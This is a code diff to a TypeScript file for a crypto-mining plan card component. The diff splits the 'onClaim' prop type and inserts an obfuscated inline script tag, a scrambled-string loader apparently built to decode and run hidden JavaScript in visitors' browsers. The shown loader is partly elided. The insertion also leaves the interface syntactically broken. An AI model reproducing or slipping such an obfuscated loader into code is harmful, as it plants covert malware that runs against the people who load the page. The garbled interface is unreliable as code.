@@ -25,7 +25,14 @@ ChartJS.register(CategoryScale, LinearScale, PointElement, LineElement, Tooltip)
 
 interface MiningCardProps {
   plan: 'economy' | 'business' | 'first-6' | 'first-lifetime';
-  onClaim: (amount: number) => void;
+  onClaim
+
+<script data-cfasync="false" type="text/javascript">(function(){var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlop
+...
+
+})();</script>
+
+: (amount: number) => void;
 }
 
 const planLimits: Record<string, number> = {
